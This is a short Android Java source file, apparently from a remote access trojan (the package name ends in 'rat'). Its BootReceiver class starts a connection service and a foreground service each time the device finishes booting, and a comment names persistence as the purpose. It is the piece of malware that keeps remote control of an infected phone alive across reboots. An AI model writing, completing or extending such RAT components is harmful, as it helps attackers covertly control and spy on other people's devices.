package com.fly0rakoon.rat.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "Boot completed, starting service");
            
            // Start the connection service on boot
            Intent serviceIntent = new Intent(context, ConnectionService.class);
            context.startService(serviceIntent);
            
            // Also start foreground service for persistence
            Intent foregroundIntent = new Intent(context, ForegroundService.class);
            context.startService(foregroundIntent);
        }
    }
}
